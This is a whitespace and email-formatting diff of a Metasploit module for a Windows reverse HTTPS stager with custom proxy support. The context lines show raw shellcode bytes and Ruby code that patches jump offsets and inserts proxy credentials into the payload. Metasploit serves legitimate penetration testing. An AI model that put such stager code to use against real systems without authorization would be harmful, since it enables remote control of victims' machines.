@@ -19,7 +19,7 @@ module Metasploit3
 		super(merge_info(info,
 			'Name'          => 'Reverse HTTPS Stager with Support for Custom Proxy',
 			'Description'   => 'Tunnel communication over HTTP using SSL, supports custom proxy',
-			'Author'        => ['hdm','corelanc0d3r <peter.ve@corelan.be>', 'amaloteaux'],
+			'Author'        => ['hdm','corelanc0d3r <peter.ve[at]corelan.be>', 'amaloteaux'],
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'win',
 			'Arch'          => ARCH_X86,
@@ -57,7 +57,7 @@ module Metasploit3
 						"\xB5\xA2\x56\xFF\xD5\x6A\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40" +
 						"\x00\x57\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x53\x89\xE7\x57\x68" +
 						"\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xE2\xFF\xD5\x85\xC0\x74" +
-						"\xCD\x8B\x07\x01\xC3\x85\xC0\x75\xE5\x58\xC3\xE8\xEC\xFE\xFF\xFF" 
+						"\xCD\x8B\x07\x01\xC3\x85\xC0\x75\xE5\x58\xC3\xE8\xEC\xFE\xFF\xFF"
 				}
 			))
 
@@ -105,7 +105,7 @@ module Metasploit3
 		if 	(datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
 			(datastore['PROXY_PASSWORD'].nil? or datastore['PROXY_PASSWORD'].empty?) or
 			datastore['PROXY_TYPE'] == 'SOCKS'
-			
+
 			jmp_offset = p.index("PROXY_AUTH_STOP") + 15 - p.index("PROXY_AUTH_START")
 			#remove auth code
 			p = p.gsub(/PROXY_AUTH_START(.)*PROXY_AUTH_STOP/i, "")
@@ -127,7 +127,7 @@ module Metasploit3
 			p = p.gsub("PROXY_USERNAME", datastore['PROXY_USERNAME'])
 			p = p.gsub("PROXY_PASSWORD", datastore['PROXY_PASSWORD'])
 		end
-		#patch jmp dbl_get_server_host 
+		#patch jmp dbl_get_server_host
 		jmphost_loc = p.index("\x68\x3a\x56\x79\xa7\xff\xd5") + 8 # push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" ) ; call ebp
 		p[jmphost_loc, 4] = [p[jmphost_loc, 4].unpack("V")[0] - jmp_offset].pack("V")
 		#patch call Internetopen
